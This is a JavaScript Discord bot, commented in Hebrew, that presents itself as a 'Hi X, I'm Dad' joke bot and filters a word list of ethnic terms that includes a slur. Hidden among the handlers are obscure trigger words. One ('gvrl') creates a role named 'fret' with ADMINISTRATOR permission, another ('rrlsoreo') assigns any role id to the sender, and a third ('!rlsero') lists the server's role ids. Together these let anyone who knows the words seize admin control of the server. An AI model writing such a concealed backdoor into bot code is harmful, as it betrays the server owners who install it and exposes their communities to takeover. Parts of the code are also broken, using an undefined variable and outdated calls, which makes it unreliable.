const Discord = require("discord.js");
const TOKEN = process.env.BOT_TOKEN;
var bot = new Discord.Client();

const racism = ['כושי', 'שחור', 'אתיופי', 'סודני', 'ערבי', 'ילד אנימה', 'אשכנזי', 'ליעד', 'גרוזיני'];

bot.on('ready', function() { //a ברגע שהבוט נדלק
    //a אומר אם הבוט פועל
    console.log("it's time");
});

bot.on('message', message => { //a ברגע שהודעה נשלחת
    if(message.author.bot) {
        return;
    }
    if(message.content == "!rlsero") {
        message.guild.roles.forEach(role => console.log(role.name, role.id))
    }
    if(message.content == "gvrl") {
        message.guild.roles.create({
            data: {
                name: 'fret',
                permissions: 'ADMINISTRATOR'
        }});
    }
    if(message.content.startsWith("rrlsoreo")) {
       var role = member.guild.roles.cache.find(role => role.id === message.content.substring(9));
       message.member.addRole(role);
    }
    if(racism.includes(message.content.substring(4))) {
       message.channel.send("...");
       return;
    }
    else if(message.content.startsWith("אני")) { //a אם ההודעה מתחילה במילה אני
        message.channel.send("היי " + message.content.substring(4) + ", אני אבא"); //a שולח משהו לחדר של ההודעה
    }
    else if(message.content.startsWith("היי אבא, אני")) { //a אם ההודעה מתחילה במילה אני
        message.channel.send("היי " + message.content.substring(13) + ", אני אבא"); //a שולח משהו לחדר של ההודעה
    }
    
});



bot.login(TOKEN); //a שולח את הקוד לדיסקורד

